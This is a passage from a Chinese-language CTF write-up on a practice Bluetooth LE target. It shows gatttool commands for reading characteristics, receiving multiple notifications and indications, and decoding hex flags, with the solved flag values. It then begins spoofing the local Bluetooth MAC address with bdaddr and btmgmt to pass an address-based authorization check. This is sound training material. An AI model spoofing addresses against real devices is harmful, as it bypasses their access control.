class="string">&#x27;T&#x27;</span>;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>作为一个 indication，客户端（kali)应该返回一个回应这个过程才算是完成了，但是这里我们只需要接受信息（题目要求只需要听）<br>这是它相关的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gatttool[174176]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #190 [hci0] 2811.800923</span><br><span class="line">      ATT: Write Request (0x12) len 3</span><br><span class="line">        Handle: 0x0044</span><br><span class="line">          Data[1]: 02</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#191 [hci0] 2811.840726</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #190: len 8 (1 Kb/s)</span><br><span class="line">        Latency: 39 msec (39-39 msec ~39 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          <span class="comment">#192 [hci0] 2811.887299</span></span></span><br><span class="line">      ATT: Write Response (0x13) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#193 [hci0] 2811.887312</span></span></span><br><span class="line">      ATT: Handle Value Indication (0x1d) len 22</span><br><span class="line">        Handle: 0x0044</span><br><span class="line">          Data[20]: 6337623836646431323138343863373763313133</span><br><span class="line">gatttool[174176]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #194 [hci0] 2811.887499</span><br><span class="line">      ATT: Handle Value Confirmation (0x1e) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#195 [hci0] 2811.927611</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #194: len 5 (1 Kb/s)</span><br><span class="line">        Latency: 40 msec (39-40 msec ~39 msec)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是对日志的解释，它自动处理了“客户端的确认”</p><ol><li><strong><code>gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0044 -n 02 --listen</code></strong>: 这是你执行的命令，向蓝牙地址为<code>64:B7:08:61:B9:7E</code>的设备句柄<code>0x0044</code>写入<code>0x02</code>，并监听响应。</li><li><strong><code>ACL Data TX: Handle 71 ... ATT: Write Request (0x12) len 3 ... Handle: 0x0044 Data[1]: 02</code></strong>: <code>gatttool</code>发送了一个ATT Write Request，句柄是<code>0x0044</code>，写入的数据是<code>0x02</code>。 <code>Handle 71</code> 指的是客户端与服务器之间连接的句柄。</li><li><strong><code>HCI Event: Number of Completed Packets (0x13) ... Handle: 71 ... Count: 1</code></strong>: HCI事件表明之前发送的数据包已经成功传输。</li><li><strong><code>ACL Data RX: Handle 71 ... ATT: Write Response (0x13) len 0</code></strong>: 服务器发送了一个ATT Write Response，表示成功接收到写入请求。</li><li><strong><code>ACL Data RX: Handle 71 ... ATT: Handle Value Indication (0x1d) len 22 ... Handle: 0x0044 Data: 6337623836646431323138343863373763313133</code></strong>: 关键的一行！服务器发送了一个ATT Handle Value Indication。<ul><li><code>Handle: 0x0044</code>：表明Indication是针对句柄<code>0x0044</code>的。</li><li><code>Data: 6337623836646431323138343863373763313133</code>：这是Indication携带的数据，总共20个字节，内容是<code>6337623836646431323138343863373763313133</code>。</li></ul></li><li><strong><code>ACL Data TX: Handle 71 ... ATT: Handle Value Confirmation (0x1e) len 0</code></strong>: <code>gatttool</code>发送了一个ATT Handle Value Confirmation，表示已经接收到Indication。</li></ol><h2 id="0x13-读取多个notify"><a href="#0x13-读取多个notify" class="headerlink" title="0x13 读取多个notify"></a>0x13 读取多个notify</h2><p>%% 查看 处理 0x0046 并按照它所说的去做。请记住，此通知 clallange 要求您收到多个回复才能完成。<br> %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0046 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Listen to me for multi notifications<br>听到更多的通知</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0046 -n 02 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0046 value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志是这样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gatttool[179010]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #294 [hci0] 3401.231380</span><br><span class="line">      ATT: Write Request (0x12) len 3</span><br><span class="line">        Handle: 0x0046</span><br><span class="line">          Data[1]: 02</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Command Status (0x0f) plen 4                                                           <span class="comment">#295 [hci0] 3401.232129</span></span></span><br><span class="line">      NOP (0x00|0x0000) ncmd 1</span><br><span class="line">        Status: Success (0x00)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#296 [hci0] 3401.271124</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #294: len 8 (1 Kb/s)</span><br><span class="line">        Latency: 39 msec (39-39 msec ~39 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: LE Meta Event (0x3e) plen 12                                                           <span class="comment">#297 [hci0] 3401.310917</span></span></span><br><span class="line">      LE Read Remote Used Features (0x04)</span><br><span class="line">        Status: Success (0x00)</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Features: 0xff 0x00 0x00 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">          LE Encryption</span><br><span class="line">          Connection Parameter Request Procedure</span><br><span class="line">          Extended Reject Indication</span><br><span class="line">          Peripheral-initiated Features Exchange</span><br><span class="line">          LE Ping</span><br><span class="line">          LE Data Packet Length Extension</span><br><span class="line">          LL Privacy</span><br><span class="line">          Extended Scanner Filter Policies</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          <span class="comment">#298 [hci0] 3401.315294</span></span></span><br><span class="line">      ATT: Write Response (0x13) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#299 [hci0] 3401.315301</span></span></span><br><span class="line">      ATT: Handle Value Notification (0x1b) len 22</span><br><span class="line">        Handle: 0x0046</span><br><span class="line">          Data[20]: 55206e6f2077616e742074686973206d73670000</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#300 [hci0] 3402.315328</span></span></span><br><span class="line">      ATT: Handle Value Notification (0x1b) len 22</span><br><span class="line">        Handle: 0x0046</span><br><span class="line">          Data[20]: 6339343537646535666438636166653334396664</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#301 [hci0] 3403.315400</span></span></span><br><span class="line">      ATT: Handle Value Notification (0x1b) len 22</span><br><span class="line">        Handle: 0x0046</span><br><span class="line">          Data[20]: 6339343537646535666438636166653334396664</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#302 [hci0] 3404.315311</span></span></span><br><span class="line">      ATT: Handle Value Notification (0x1b) len 22</span><br><span class="line">        Handle: 0x0046</span><br><span class="line">          Data[20]: 6339343537646535666438636166653334396664</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>收到通知后等待一下就可以了，它会自动发送剩下的通知<br>对其<code>63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64</code> 解码后得到<code>c9457de5fd8cafe349fd</code></p><h2 id="0x14-读取多个indicate"><a href="#0x14-读取多个indicate" class="headerlink" title="0x14 读取多个indicate"></a>0x14 读取多个indicate</h2><p>%% 查看 handle 0x0042 和 google search gatt 指示。请记住，此 chalange 将要求您解析多个 indicate 响应才能完成 chalange。 %%<br>读取要求<br>注意，这里写错了，不是0x0042,是0x0048</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0048 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Listen to handle 0x004a for multi indications<br>依旧是等待一会就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0048 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Listen to handle 0x004a for multi indications</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x004a -n 02 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Indication   handle = 0x004a value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 </span><br><span class="line">Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 </span><br><span class="line">Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 </span><br><span class="line">Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #481 [hci0] 3972.157187</span><br><span class="line">      ATT: Write Request (0x12) len 3</span><br><span class="line">        Handle: 0x004a</span><br><span class="line">          Data[1]: 02</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#482 [hci0] 3972.196904</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #481: len 8 (1 Kb/s)</span><br><span class="line">        Latency: 39 msec (39-39 msec ~39 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          <span class="comment">#483 [hci0] 3972.243389</span></span></span><br><span class="line">      ATT: Write Response (0x13) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#484 [hci0] 3972.243405</span></span></span><br><span class="line">      ATT: Handle Value Indication (0x1d) len 22</span><br><span class="line">        Handle: 0x004a</span><br><span class="line">          Data[20]: 55206e6f2077616e742074686973206d73670000</span><br><span class="line">gatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #485 [hci0] 3972.244208</span><br><span class="line">      ATT: Handle Value Confirmation (0x1e) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#486 [hci0] 3972.276942</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #485: len 5 (1 Kb/s)</span><br><span class="line">        Latency: 32 msec (32-39 msec ~36 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#487 [hci0] 3972.323414</span></span></span><br><span class="line">      ATT: Handle Value Indication (0x1d) len 22</span><br><span class="line">        Handle: 0x004a</span><br><span class="line">          Data[20]: 6236663361343766323037643338653136666661</span><br><span class="line">gatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #488 [hci0] 3972.323538</span><br><span class="line">      ATT: Handle Value Confirmation (0x1e) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#489 [hci0] 3972.356801</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #488: len 5 (1 Kb/s)</span><br><span class="line">        Latency: 33 msec (32-39 msec ~34 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         <span class="comment">#490 [hci0] 3972.411338</span></span></span><br><span class="line">      ATT: Handle Value Indication (0x1d) len 22</span><br><span class="line">        Handle: 0x004a</span><br><span class="line">          Data[20]: 6236663361343766323037643338653136666661</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解码得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo &quot;6236663361343766323037643338653136666661&quot; | xxd -r -p </span><br><span class="line">b6f3a47f207d38e16ffa                                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x15-修改蓝牙mac地址"><a href="#0x15-修改蓝牙mac地址" class="headerlink" title="0x15 修改蓝牙mac地址"></a>0x15 修改蓝牙mac地址</h2><p>%% 查看 处理 0x004c 并按照它所说的去做。与以太网或 wifi 设备非常相似，您也可以更改蓝牙设备的 mac 地址。 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004c | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Connect with BT MAC address 11:22:33:44:55:66<br>当有设备连接时，它会检查连接过来的设备的 MAC 地址。只有当连接设备的 MAC 地址正好是 11:22:33:44:55:66 时，它才会认为这个连接是“特殊”的或“授权”的，并触发某个成功的状态（例如，更新某个特征的值，像源代码里处理 MAC 地址匹配的部分）。</p><p>这是我自己当前的蓝牙地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hciconfig        </span><br><span class="line">hci0:   Type: Primary  Bus: USB</span><br><span class="line">        BD Address: 84:E0:F4:03:0F:5E  ACL MTU: 310:10  SCO MTU: 64:8</span><br><span class="line">        UP RUNNING </span><br><span class="line">        RX bytes:7079 acl:107 sco:0 events:414 errors:0</span><br><span class="line">        TX bytes:6887 acl:85 sco:0 commands:214 errors:0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bdaddr"><a href="#bdaddr" class="headerlink" title="bdaddr"></a>bdaddr</h3><p>在这里使用bdaddr来对地址进行修改，会显示安装失败，也没有办法找到它的安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install bluez-utils</span><br></pre></td></tr></table></figure><p>使用bdaddr会简单方便很多，但是它在新版本中好像不存在了<br>方法如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hciconfig hci0 down</span><br><span class="line">sudo bdaddr -i hci0 11:22:33:44:55:66</span><br><span class="line">sudo hciconfig hci0 up</span><br></pre></td></tr></table></figure><h3 id="btmgmt"><a href="#btmgmt" class="headerlink" title="btmgmt"></a>btmgmt</h3><p>这里找到了另外一个工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo btmgmt                     </span><br><span class="line"><span class="meta prompt_">[mgmt]# </span><span class="language-bash"><span class="built_in">help</span></span></span><br><span class="line">Menu mgmt:</span><br><span class="line">Available commands:</span><br><span class="line">-------------------</span><br><span class="line">monitor                                           Advertisement Monitor Submenu</span><br><span class="line">select &lt;index&gt;                                    Select a different index</span><br><span class="line">revision                                          Get the MGMT Revision</span><br><span class="line">commands                                          List supported commands</span><br><span class="line">config                                            Show configuration info</span><br><span class="line">info                                              Show controller info</span><br><span class="line">extinfo                                           Show extended controller info</span><br><span class="line">auto-power                                        Power all available features</span><br><span class="line">power &lt;on/off&gt;                                    Toggle powered state</span><br><span class="line">discov &lt;yes/no/limited&gt; [timeout]                 Toggle discoverable state</span><br><span class="line">connectable &lt;on/off&gt;                              Toggle connectable state</span><br><span class="line">fast-conn &lt;on/off&gt;                                Toggle fast connectable state</span><br><span class="line">bondable &lt;on/off&gt;                                 Toggle bondable state</span><br><span class="line">pairable &lt;on/off&gt;                                 Toggle bondable state</span><br><span class="line">linksec &lt;on/off&gt;                                  Toggle link level security</span><br><span class="line">ssp &lt;on/off&gt;                                      Toggle SSP mode</span><br><span class="line">sc &lt;on/off/only&gt;                                  Toggle SC support</span><br><span class="line">hs &lt;on/off&gt;                                       Toggle HS support</span><br><span class="line">le &lt;on/off&gt;                                       Toggle LE support</span><br><span class="line">advertising &lt;on/off&gt;                              Toggle LE advertising</span><br><span class="line">bredr &lt;on/off&gt;                                    Toggle BR/EDR support</span><br><span class="line">privacy &lt;on/off&gt; [irk]                            Toggle privacy support</span><br><span class="line">class &lt;major&gt; &lt;minor&gt;                             Set device major/minor class</span><br><span class="line">disconnect [-t type] &lt;remote address&gt;             Disconnect device</span><br><span class="line">con                                               List connections</span><br><span class="line">find [-l|-b] [-L]                                 Discover nearby devices</span><br><span class="line">find-service [-u UUID] [-r RSSI_Threshold] [-l|-b] Discover nearby service</span><br><span class="line">stop-find [-l|-b]                                 Stop discovery</span><br><span class="line">name &lt;name&gt; [shortname]                           Set local name</span><br><span class="line">pair [-c cap] [-t type] &lt;remote address&gt;          Pair with a remote device</span><br><span class="line">cancelpair [-t type] &lt;remote address&gt;             Cancel pairing</span><br><span class="line">unpair [-t type] &lt;remote address&gt;                 Unpair device</span><br><span class="line">keys                                              Load Link Keys</span><br><span class="line">ltks                                              Load Long Term Keys</span><br><span class="line">irks [--local index] [--file file path]           Load Identity Resolving Keys</span><br><span class="line">block [-t type] &lt;remote address&gt;                  Block Device</span><br><span class="line">unblock [-t type] &lt;remote address&gt;                Unblock Device</span><br><span class="line">add-uuid &lt;UUID&gt; &lt;service class hint&gt;              Add UUID</span><br><span class="line">rm-uuid &lt;UUID&gt;                                    Remove UUID</span><br><span class="line">clr-uuids                                         Clear UUIDs</span><br><span class="line">local-oob                                         Local OOB data</span><br><span class="line">remote-oob [-t &lt;addr_type&gt;] [-r &lt;rand192&gt;] [-h &lt;hash192&gt;] [-R &lt;rand256&gt;] [-H &lt;hash256&gt;] &lt;addr&gt; Remote OOB data</span><br><span class="line">did &lt;source&gt;:&lt;vendor&gt;:&lt;product&gt;:&lt;version&gt;         Set Device ID</span><br><span class="line">static-addr &lt;address&gt;                             Set static address</span><br><span class="line">public-addr &lt;address&gt;                             Set public address</span><br><span class="line">ext-config &lt;on/off&gt;                               External configuration</span><br><span class="line">debug-keys &lt;on/off&gt;                               Toggle debug keys</span><br><span class="line">conn-info [-t type] &lt;remote address&gt;              Get connection information</span><br><span class="line">io-cap &lt;cap&gt;                                      Set IO Capability</span><br><span class="line">scan-params &lt;interval&gt; &lt;window&gt;                   Set Scan Parameters</span><br><span class="line">get-clock [address]                               Get Clock Information</span><br><span class="line">add-device [-a action] [-t type] &lt;address&gt;        Add Device</span><br><span class="line">del-device [-t type] &lt;address&gt;                    Remove Device</span><br><span class="line">clr-devices                                       Clear Devices</span><br><span class="line">bredr-oob                                         Local OOB data (BR/EDR)</span><br><span class="line">le-oob                                            Local OOB data (LE)</span><br><span class="line">advinfo                                           Show advertising features</span><br><span class="line">advsize [options] &lt;instance_id&gt;                   Show advertising size info</span><br><span class="line">add-adv [options] &lt;instance_id&gt;                   Add advertising instance</span><br><span class="line">rm-adv &lt;instance_id&gt;                              Remove advertising instance</span><br><span class="line">clr-adv                                           Clear advertising instances</span><br><span class="line">add-ext-adv-params [options] &lt;instance_id&gt;        Add extended advertising params</span><br><span class="line">add-ext-adv-data [options] &lt;instance_id&gt;          Add extended advertising data</span><br><span class="line">appearance &lt;appearance&gt;                           Set appearance</span><br><span class="line">phy [LE1MTX] [LE1MRX] [LE2MTX] [LE2MRX] [LECODEDTX] [LECODEDRX] [BR1M1SLOT] [BR1M3SLOT] [BR1M5SLOT][EDR2M1SLOT] [EDR2M3SLOT] [EDR2M5SLOT][EDR3M1SLOT] [EDR3M3SLOT] [EDR3M5SLOT] Get/Set PHY Configuration</span><br><span class="line">wbs &lt;on/off&gt;                                      Toggle Wideband-Speech support</span><br><span class="line">secinfo                                           Show security information</span><br><span class="line">expinfo                                           Show experimental features</span><br><span class="line">exp-debug &lt;on/off&gt;                                Set debug feature</span><br><span class="line">exp-privacy &lt;on/off&gt;                              Set LL privacy feature</span><br><span class="line">exp-quality &lt;on/off&gt;                              Set bluetooth quality report feature</span><br><span class="line">exp-offload &lt;on/off&gt;                              Toggle codec support</span><br><span class="line">read-sysconfig                                    Read System Configuration</span><br><span class="line">set-sysconfig &lt;-v|-h&gt; [options...]                Set System Configuration</span><br><span class="line">get-flags [-t type] &lt;address&gt;                     Get device flags</span><br><span class="line">set-flags [-f flags] [-t type] &lt;address&gt;          Set device flags</span><br><span class="line">menu &lt;name&gt;                                       Select submenu</span><br><span class="line">version                                           Display version</span><br><span class="line">quit                                              Quit program</span><br><span class="line">exit                                              Quit program</span><br><span class="line">help                                              Display help about this program</span><br><span class="line">export                                            Print environment variables</span><br><span class="line">script &lt;filename&gt;      </span><br></pre></td></tr></table></figure><p>使用方法如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 进入 btmgmt 交互模式</span></span><br><span class="line">sudo btmgmt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span 